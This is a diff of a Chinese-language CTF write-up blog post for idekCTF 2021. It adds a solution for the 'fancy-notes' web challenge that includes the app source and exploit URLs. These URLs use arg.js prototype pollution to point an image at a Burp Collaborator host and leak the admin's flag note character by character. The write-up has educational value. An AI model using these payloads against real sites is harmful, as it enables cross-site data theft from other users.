@@ -1,7 +1,7 @@
 ---
 title: "idekCTF2021 Wp"
 slug: "idekctf2021-wp"
-description: "只有部分的web，js别问，问就是不会"
+description: "只有部分的web，少两个js"
 date: 2021-12-15T21:11:49+08:00
 categories: ["CTF"]
 series: []
@@ -305,6 +305,253 @@ if __name__ == '__main__':
 ![image-20211213140710659](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213140710659.png)
 
 `idek{us1nG_f1lt3rs_t0_byP4s5_f1lt3r5}`
+
+## fancy-notes
+
+> Your typical note taking app, but this time it's fancy! Share your coolest notes with the admin, and if they're cool enough, maybe he'll give you a special prize.
+>
+> http://fancy-notes.chal.idek.team  |  https://ctf.idek.team/handouts/web/FancyNotes/fancy-notes-dist.zip
+
+一个flask，有提交notes的地方，尝试SSTI失败
+
+![image-20211214000607181](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214000607181.png)
+
+看代码逻辑没有什么特别的
+
+```python
+from flask import Flask, redirect, request, session, send_from_directory, render_template
+import os
+import sqlite3
+import subprocess
+
+app = Flask(__name__, static_url_path='/static', static_folder='static', template_folder='templates')
+app.secret_key = os.getenv('SECRET', 'secret')  # secret passwd在环境变量中
+ADMIN_PASS = os.getenv('ADMIN_PASS', 'password')
+flag = open('flag.txt', 'r').read() # flag is here
+
+
+def init_db():
+    con = sqlite3.connect('/tmp/database.db')   # sqlite数据库
+    cur = con.cursor()
+    cur.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)')
+    cur.execute('INSERT INTO USERS (username, password) VALUES ("admin", ?)', [ADMIN_PASS]) # 插入admin账号密码
+    cur.execute('CREATE TABLE IF NOT EXISTS notes (title TEXT NOT NULL, content TEXT NOT NULL, owner TEXT NOT NULL)')
+    cur.execute('INSERT INTO notes (title, content, owner) VALUES ("flag", ?, 1)', [flag])  # 插入flag进入notes表
+    con.commit()
+    con.close()
+
+def try_login(username, password):  # 从数据库中看有没有匹配的账号密码 返回第一条 不存在覆盖
+    con = sqlite3.connect('/tmp/database.db')
+    cur = con.cursor()
+    cur.execute('SELECT * FROM users WHERE username = ? AND password = ?', [username, password])
+    row = cur.fetchone()
+    if row:
+        return {'id': row[0], 'username': row[1]}
+
+
+def try_register(username, password):   # 插入新的用户名数据进入users表
+    con = sqlite3.connect('/tmp/database.db')
+    cur = con.cursor()
+    try:
+        cur.execute('INSERT INTO users (username, password) VALUES (?, ?)', [username, password])
+    except sqlite3.IntegrityError:
+        return None
+    con.commit()
+    con.close()
+    return True
+
+
+def find_note(query, user): # 寻找user的note
+    con = sqlite3.connect('/tmp/database.db')
+    cur = con.cursor()
+    cur.execute('SELECT title, content FROM notes WHERE owner = ? AND (INSTR(content, ?) OR INSTR(title,?))', [user, query, query])
+    rows = cur.fetchone()
+    return rows
+
+
+def get_notes(user):    # 得到user的全部notes
+    con = sqlite3.connect('/tmp/database.db')
+    cur = con.cursor()
+    cur.execute('SELECT title, content FROM notes WHERE owner = ?', [user])
+    rows = cur.fetchall()
+    return rows
+
+
+def create_note(title, content, user):  # 创建user的note进入notes表
+    con = sqlite3.connect('/tmp/database.db')
+    cur = con.cursor()
+    cur.execute('SELECT title FROM notes where title=? AND owner=?', [title, user])
+    row = cur.fetchone()
+    if row:
+        return False
+    cur.execute('INSERT INTO notes (title, content, owner) VALUES (?, ?, ?)', [title, content, user])
+    con.commit()
+    con.close()
+    return True
+
+
+@app.before_first_request   # 请求之前先删除/tmp/database.db 之后初始化
+def setup():
+    try:
+        os.remove('/tmp/database.db')
+    except:
+        pass
+    init_db()
+
+
+@app.after_request  # 返回响应时针对cache添加no-store的响应头
+def add_headers(response):
+    response.headers['Cache-Control'] = 'no-store'
+    return response
+
+
+@app.route('/')
+def index():
+    if not session:
+        return redirect('/login')   # 没有session记录先登录
+    notes = get_notes(session['id'])    # session['id']中存储id session['username']中存储username
+    return render_template('index.html', notes=notes, message='select a note to fancify!')  # 无过滤但是不存在SSTI
+
+
+@app.route('/login', methods = ['GET', 'POST'])
+def login():
+    if request.method == 'GET':
+        return render_template('login.html')
+    if request.method == 'POST':
+        password = request.form['password']
+        username = request.form['username']
+        user = try_login(username, password)    # 匹配admin或flag
+        if user:
+            session['id'] = user['id']
+            session['username'] = user['username']
+            return redirect('/')
+        else:
+            return render_template('login.html', message='login failed!')
+
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'GET':
+        return render_template('register.html')
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        if try_register(username, password):
+            return redirect('/login')
+        return render_template('register.html', message='registration failed!')
+
+
+@app.route('/create', methods=['GET', 'POST'])
+def create():
+    if not session:
+        return redirect('/login')
+    if session['username'] == 'admin':
+        return 'nah'
+    if request.method == 'GET':
+        return render_template('create.html')
+    if request.method == 'POST':
+        title = request.form['title']
+        content = request.form['content']
+        if len(title) >= 36 or len(content) >= 256: # 没有SSTI
+            return 'pls no'
+        if create_note(title, content, session['id']):
+            return render_template('create.html', message='note successfully uploaded!')
+        return render_template('create.html', message='you already have a note with that title!')
+
+@app.route('/fancy')
+def fancify():
+    if not session:
+        return redirect('/login')
+    if 'q' in request.args: # 不论get or post
+        def filter(obj):
+            return any([len(v) > 1 and k != 'q' for k, v in request.args.items()])  # 长度不超过1
+        if not filter(request.args):
+            results = find_note(request.args['q'], session['id'])   # 查找user的note q是title或content
+            if results:
+                message = 'here is your 𝒻𝒶𝓃𝒸𝓎 note!'
+            else:
+                message = 'no notes found!'
+            return render_template('fancy.html', note=results, message=message)
+        return render_template('fancy.html', message='bad format! Your style params should not be so long!')
+    return render_template('fancy.html')
+
+
+@app.route('/report', methods=['GET', 'POST'])
+def report():
+    if not session:
+        return redirect('/')
+    if request.method == 'GET':
+        return render_template('report.html')
+    url = request.form['url']
+    subprocess.Popen(['node', 'bot.js', url], shell=False)
+    return render_template('report.html', message='admin visited your url!')
+
+
+
+app.run('0.0.0.0', 1337)
+
+```
+
+除了app.py还有一个fancify.js有点东西
+
+```js
+function fancify(note) {
+	color = (args.style || Math.floor(Math.random() * 6)).toString();
+	image = this.image || '/static/images/success.png';	// 支持传入image参数
+	styleElement = note.children[2];
+	styleElement.innerHTML = style; // i have no idea why i did this in such a scuffed way but I'm too lazy to change it. no this is not vulnerable
+	note.className = `animation${color}`;
+	img = new Image();
+	img.src = image
+	note.append(img);
+}
+
+args = Arg.parse(location.search);
+noteElement = document.getElementById('note');
+
+if(noteElement){
+	fancify(noteElement);
+}
+
+```
+
+交互过程总体是这样的：可以输入并保存note，之后选择我们的note将其fancify之后渲染出来
+
+```
+http://fancy-notes.chal.idek.team/fancy?q=Note+1&style=2
+```
+
+其中除了q以外的参数长度不超过1，如果没有指定image并且note存在就会出现success.png的图片，指定了的话就是对应图片
+
+另外还有一个经典report的bot，它以admin身份登入后写入一条含有flag的note，之后访问我们的url
+
+我一开始在python的SSTI部分浪费了一部分时间，想着明明没有过滤为什么不能执行命令，后来才知道考点就不在这里
+
+这个题其实跟[uiuCTF2021]YANA很像，也是纯client-side安全问题和char-by-char思想的运用，而更方便的是这里连回显方式都十分明确：含有指定内容的note存在则渲染success.png 不存在则不渲染，并且这个图片我们可以指定，那将其设为我们自己服务器上的图片，并char-by-char的盲注查询字符就可以得到flag的内容了，就像这样
+
+```
+http://fancy-notes.chal.idek.team/fancy?q=idekctf{&image=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/
+```
+
+不够并没有这么轻松，app.py中限制了除q参数以外的参数字符不超过1，如何绕过呢？
+
+肥肠的鸡贼，在fancy.html中引入了一个外部的js脚本
+
+```html
+<script src="https://raw.githack.com/stretchr/arg.js/master/dist/arg-1.4.js"></script>
+```
+
+而这个arg.js是存在js原型污染的洞并且有现成的POC->https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md
+
+这不就好说了？
+
+```
+http://fancy-notes.chal.idek.team/fancy?q=idekctf{&__proto__[image]=x&__proto__[image]=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/
+```
+
+之后只需要对q参数的后面char-by-char地盲注即可
+
+参考：[wp](https://fireshellsecurity.team/idekctf-writeups/#fancy-notes)
 
 ## steghide-as-a-service
 
@@ -625,8 +872,12 @@ print(exploit)
 
 ------
 
-少了三道js的题，我的，下次一定！
+~~少了三道js的题，我的，下次一定！~~
+
+现在少2道了
 
 另外steghide-as-a-service这道题感谢师傅的帮助（我自己卡到一个很蠢的地方了
 
-最近有点摆烂，属于是春困秋乏里面的冬眠了，我尽量保持一个好的状态
+最近有点摆烂，属于是春困秋乏里面的冬眠了，睡不醒的冬三月啊啊啊啊啊啊
+
+北京冬至的时候日出日落之间只有9个半小时不到，谁听了不想睡死过去（
